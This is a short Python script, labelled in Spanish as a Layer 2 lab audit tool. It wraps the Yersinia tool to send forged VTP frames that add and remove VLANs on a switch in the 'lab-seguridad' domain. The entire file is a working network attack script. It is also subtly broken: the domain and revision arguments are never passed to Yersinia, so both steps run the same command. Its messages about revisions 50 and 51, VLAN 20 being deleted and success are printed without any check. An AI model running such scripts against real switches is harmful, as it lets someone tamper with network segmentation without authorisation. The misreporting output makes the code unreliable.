#!/usr/bin/env python3
import os
import sys
import subprocess
import time

def verificar_privilegios():
    """Asegura que el script se ejecute con permisos de root"""
    if os.getuid() != 0:
        print("[-] Error: Este script requiere privilegios de administrador.")
        print(f"[*] Intenta ejecutarlo usando: sudo python3 {sys.argv[0]}")
        sys.exit(1)

def enviar_actualizacion_vtp(interfaz, dominio, revision):
    """Convoca a Yersinia para lanzar el ataque de falsificación VTP (Attack 4)"""
    comando = ["yersinia", "vtp", "-attack", "4", "-interface", interfaz]
    try:
        process = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)
        process.terminate()
    except FileNotFoundError:
        print("[-] Error: 'yersinia' no se encuentra instalado en este sistema.")
        sys.exit(1)

def main():
    verificar_privilegios()
    print("="*60)
    print("   AUTOMATIZACIÓN DE AUDITORÍA VTP - LABORATORIO CAPA 2   ")
    print("="*60)
    interfaz = "eth0"
    dominio = "lab-seguridad"
    print(f"[*] Interfaz configurada: {interfaz}")
    print(f"[*] Dominio VTP objetivo: {dominio}\n")
    print("--- PASO 1: Inyección y Creación de dos VLANs ---")
    print("[+] Enviando tramas VTP con Revisión: 50 (VLAN 10 y VLAN 20)...")
    enviar_actualizacion_vtp(interfaz, dominio, 50)
    print("[+] Inyección completada. Verifica tu switch con 'show vlan brief'.")
    input("\n[?] PULSA [ENTER] PARA ELIMINAR LA SEGUNDA VLAN (VLAN 20) DEL SWITCH...")
    print("\n--- PASO 2: Eliminación de la segunda VLAN ---")
    print("[+] Enviando nueva trama con Revisión: 51 (Solo VLAN 10)...")
    enviar_actualizacion_vtp(interfaz, dominio, 51)
    print("[+] Proceso de eliminación finalizado con éxito.")

if __name__ == "__main__":
    main()
